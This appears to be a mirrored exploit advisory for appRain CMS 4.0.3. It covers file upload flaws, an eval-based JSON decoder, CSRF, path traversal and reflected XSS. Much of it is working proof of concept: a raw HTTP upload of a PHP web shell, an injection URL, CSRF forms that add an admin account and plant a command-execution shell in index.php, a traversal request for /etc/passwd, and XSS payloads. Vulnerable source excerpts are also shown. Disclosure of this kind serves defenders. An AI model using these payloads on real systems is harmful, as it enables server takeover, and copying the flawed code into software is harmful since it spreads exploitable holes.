@@ -1,0 +1,419 @@
+id: 24693
+date: 12/10/2015
+title: appRain 4.0.3 - Multiple Vulnerabilities
+author: Tim Coen
+cves: 
+
+appRain 4.0.3 Code Execution , XSS, CSRF , Path Traversal Vulnerabilities
+
+
+appRain is described as a Content Management Framework written in PHP.
+
+There are various components of appRain 4.0.3 that should not provide the
+possibility of code execution or arbitrary file upload but do allow it.
+
+All of these issues are by default present in the admin area. It should be
+noted that admins already have code execution via a designated PHP file editor.
+
+Still, the code of appRain is explicitly intended to be extended by its users,
+which means that components such as a seemingly secure file uploader, an image
+uploader, or a function decoding json should not lead to code execution.
+
+  Unrestricted Upload of File with Dangerous Type 1
+
+CVSS
+
+High 9.0 AV:N/AC:L/Au:S/C:C/I:C/A:C
+
+Description
+
+The file upload uses a blacklist for the file extension to forbid the upload of
+files with dangerous type. The disallowed extensions are:
+php,php3,php4,exe,pl,py,bat,sys,dev,sh
+
+However, files that can be uploaded and that also lead to code execution are
+.htaccess, as well as files with extension pht, php5, and phtml.
+
+The file upload can be found here:
+http://localhost/apprain/admin/filemanager
+
+An admin account is required to use the file manager. It should be noted that
+an admin already has code execution via the designated PHP file editor. Still,
+this is an access violation in the context of this component and will also be
+an issue if users reuse the varifyFileName function in different contexts,
+which is to be expected.
+
+Code
+
+
+/development/controllers/admin.php
+if(!App::Module('Filemanager')->varifyFileName($this->data['filemanager']['image']['name'])){
+            App::Module('Notification')->Push("File({$this->data['filemanager']['image']['name']}) is restricted to uploaded.","Error");
+            App::Config()->redirect("/admin/filemanager/upload");
+    }
+    else {
+            $path = App::Config()->filemanagerDir(DS);
+            $data = App::Utility()->upload($this->data['filemanager']['image'],$path);
+            App::Module('Notification')->Push("File({$data['file_name']}) uploaded successfully.");
+            App::Config()->redirect("/admin/filemanager");
+    }
+
+/apprain/base/modules/filemanager.php
+            public function varifyFileName($filename){
+                    $restrictedExt = explode(',',app::__def()->sysConfig('FILE_MANAGER_RESTRICTED_EXT'));
+                    return !in_array(App::Utility()->getExt($filename),$restrictedExt);
+            }
+
+/development/definition/system_configuration/config.xml:
+<value><![CDATA[php,php3,php4,exe,pl,py,bat,sys,dev,sh]]></value>
+
+  Unrestricted Upload of File with Dangerous Type 2
+
+CVSS
+
+High 9.0 AV:N/AC:L/Au:S/C:C/I:C/A:C
+
+Description
+
+When creating a new slide, the label suggests that only images with extensions
+"*.jpeg, *.gif" may be uploaded. However, arbitrary files can be uploaded,
+including .php or .pht files.
+
+An admin account is required to create new slides. It should be noted that an
+admin already has code execution via the designated PHP file editor. Still,
+this is an access violation in the context of this component and may also be an
+issue if users reuse the involved functions in different contexts.
+
+Proof of Concept
+
+
+POST /apprain/information/manage/appslide/add HTTP/1.1
+Host: localhost
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=4d7rqc7hj3ej5j403nf4ktmq42
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------418924992299141519661615194
+Content-Length: 1178
+
+-----------------------------418924992299141519661615194
+Content-Disposition: form-data; name="data[Option][title]"
+
+test
+-----------------------------418924992299141519661615194
+Content-Disposition: form-data; name="data[Option][image]"; filename="test.pht"
+Content-Type: application/octet-stream
+
+<?php
+passthru($_GET['x']);
+
+-----------------------------418924992299141519661615194
+Content-Disposition: form-data; name="data[Option][description]"
+
+<p>test</p>
+
+-----------------------------418924992299141519661615194
+Content-Disposition: form-data; name="data[Option][status]"
+
+Active
+-----------------------------418924992299141519661615194
+Content-Disposition: form-data; name="Button[button_save]"
+
+Save
+-----------------------------418924992299141519661615194
+Content-Disposition: form-data; name="data[Information][id]"
+
+
+-----------------------------418924992299141519661615194
+Content-Disposition: form-data; name="data[Information][type]"
+
+appslide
+-----------------------------418924992299141519661615194
+Content-Disposition: form-data; name="data[Information][page]"
+
+
+-----------------------------418924992299141519661615194--
+
+  Possibly Code Execution
+
+CVSS
+
+High 7.6AV:N/AC:H/Au:N/C:C/I:C/A:C
+
+Description
+
+appRain is described as "Content Management Framework", and as such, it is to
+be expected that public functions are reused in different contexts and should
+thus be secure.
+
+If the function to decode json is used as described in the documentation, it
+will be unsecure if user input is passed to it, which is a likely scenario.
+This is also how it seems to be used by deletegroupAction, which is currently
+not used anywhere. If a user actually uses either of these functions, the code
+would likely be vulnerable.
+
+Proof of Concept
+
+
+Use the function, for example by adding the following to app.php:
+    $data = App::Module('Cryptography')
+        ->jsonDecode('{"status":"Success","message":"' . $_GET['x'] . ' Updated successfully"}');
+    pre($data);
+
+Now an attacker can gain code execution:
+    http://localhost/apprain/?x=");passthru("touch 'test.php'");$y=array("x"=>"
+
+Code
+
+
+/apprain/base/modules/cryptography.php
+public function jsonDecode($json)
+{
+    // Author: walidator.info 2009
+    $comment = false;
+    $out = '$x=';
+
+    for ($i = 0; $i < strlen($json); $i++) {
+if (!$comment) {
+    if ($json[$i] == '{') {
+$out .= ' array(';
+    }
+    else if ($json[$i] == '}') {
+$out .= ')';
+    }
+    else if ($json[$i] == ':') {
+$out .= '=>';
+    }
+    else {
+$out .= $json[$i];
+    }
+}
+else {
+    $out .= $json[$i];
+}
+if ($json[$i] == '"') {
+    $comment = !$comment;
+}
+    }
+
+    eval($out . ';');
+
+    return $x;
+}
+
+
+----------------------------------------------------------------
+
+
+appRain 4.0.3 Cross Site Request Forgery
+
+ Description
+
+None of the requests have CSRF protection. This means that an attacker can
+execute actions for an admin if the admin visits an attacker controlled website
+while logged in.
+
+ Proof of Concept
+
+
+Add new Admin:
+
+<html>
+  <body>
+    <form action="http://localhost/apprain-source-4.0.3/admin/manage/add/" method="POST">
+      <input type="hidden" name="data[Admin][f_name]" value="foo" />
+      <input type="hidden" name="data[Admin][l_name]" value="foo" />
+      <input type="hidden" name="data[Admin][email]" value="foo@example.com" />
+      <input type="hidden" name="data[Admin][username]" value="foo" />
+      <input type="hidden" name="data[Admin][password]" value="fdnki2@#E@Kkfod" />
+      <input type="hidden" name="data[Admin][status]" value="Active" />
+      <input type="hidden" name="data[Admin][description]" value="foo" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+Code Execution (using the PHP file editor):
+
+<html>
+  <body>
+    <form action="http://localhost/apprain-source-4.0.3/appeditor/index?loc=webroot/index.php" method="POST">
+      <input type="hidden" name="content" value="<?php
+/**
+ * ---
+ * appRain CMF
+ *
+ * LICENSE
+ *
+ * This source file is subject to the MIT license that is bundled
+ * with this package in the file LICENSE.txt.
+ * It is also available through the world-wide-web at this URL:
+ * http://www.opensource.org/licenses/mit-license.php
+ * If you did not receive a copy of the license and are unable to
+ * obtain it through the world-wide-web, please send an email
+ * to license@apprain.com so we can send you a copy immediately.
+ *
+ * @copyright  Copyright (c) 2010 appRain, Team. (http://www.apprain.com)
+ * @license    http://www.opensource.org/licenses/mit-license.php MIT license
+ *
+ * HELP
+ *
+ * Official Website
+ * http://www.apprain.com/
+ *
+ * Download Link
+ * http://www.apprain.com/download
+ *
+ * Documents Link
+ * http ://www.apprain.com/docs
+ */
+
+if (version_compare(phpversion(), '5.1.0', '<') === true) {
+    die("<strong>Whoops, it looks like you have an invalid PHP version.</strong><br /><span>appRain supports PHP 5.1.0 or newer.</span>");
+}
+
+$appLoc = "../app.php";
+
+if (!file_exists($appLoc)) {
+    die("appRain core file(s) missing... Get a new copy ");
+}
+
+error_reporting(E_ALL);
+
+require_once $appLoc;
+
+umask(0);
+
+App::Run();
+
+passthru($_GET['x']);" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+The injected code can now be executed here:
+    http://localhost/apprain-source-4.0.3/webroot/index.php?x=ls
+
+  Solution
+
+To mitigate this issue please install the "Data Exchange Security" module:
+
+http://www.apprain.com/extension/20/accounting-system?s=Description
+
+
+
+-----------------------------------------------------
+
+appRain 4.0.3 Path Traversal
+
+Description
+
+The "loc" Parameter of the appeditor is vulnerable to directory traversal,
+which allows the viewing of arbitrary files.
+
+Admin credentials are required to view files. It should be noted that an admin
+already has code execution via the designated PHP file editor. Still, this is
+an access violation in the context of this component.
+
+ Proof of Concept
+
+
+http://localhost/apprain-source-4.0.3/appeditor?loc=../../../../../../../etc/passwd
+
+  Solution
+
+This issue was not fixed by the vendor.
+
+
+-------------------------------------------
+
+appRain 4.0.3 Cross Site Scripting
+
+ Overview
+
+There are two reflected XSS vulnerabilities in appRain 4.0.3. This can lead to
+the injection of JavaScript keyloggers or the bypassing of CSRF protection. In
+the case of appRain, this may lead to code execution.
+
+ XSS 1
+
+CVSS
+
+Medium 4.3 AV:N/AC:M/Au:N/C:N/I:P/A:N
+
+Description
+
+The search of the file manager echoes user input without encoding, leading to
+reflected XSS.
+
+  Proof of Concept
+
+
+<html>
+  <body>
+    <form action="http://localhost/apprain-source-4.0.3/admin/filemanager/upload" method="POST">
+      <input type="hidden" name="data[FileManager][search]" value="'"><script>alert(1)</script>" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+Code
+
+
+/apprain/base/modules/toolbar.php
+private function btnFilemanagerSrcBox($srcstr = "")
+{
+
+    $html = '<form method="post">
+    <input type="text" name="data[FileManager][search]" value="' . $srcstr . '" />
+    <div class="button" style="float:right"><input type="submit" value="Search" /></pre>
+    </form>';
+
+    return array('box' => $html);
+}
+
+ XSS 2
+
+CVSS
+
+Medium 4.3 AV:N/AC:M/Au:N/C:N/I:P/A:N
+
+Description
+
+The appeditor echoes the given file name and path without encoding, leading to
+reflected XSS.
+
+Proof of Concept
+
+
+http://localhost/apprain-source-4.0.3/appeditor?loc='"><script>alert(1)</script>
+
+Code
+
+
+/component/appeditor/controllers/appeditor/index.phtml
+<?php foreach($fileeditorqueue as $row):?>
+        <?php $farr = explode('/',$row);?>
+        <?php if( $row == $loc):?>
+                <li class="ui-tabs-selected">
+<a href="?loc=<?php echo $row ;?>" title="<?php echo $row ;?>"><?php echo(end($farr)); ?></a>
+                </li>
+        <?php else: ?>
+                <li>
+<a href="?loc=<?php echo $row ;?>" title="<?php echo $row ;?>"><?php echo(end($farr));?></a>
+<span class="closefiletab">X</span>
+                </li>
+        <?php endif;?>
+<?php endforeach;?>
+
+  Solution
+
+This issue was not fixed by the vendor.
+
+
+------------------------------------------
+
+#  0day.today [2023-03-27]  #
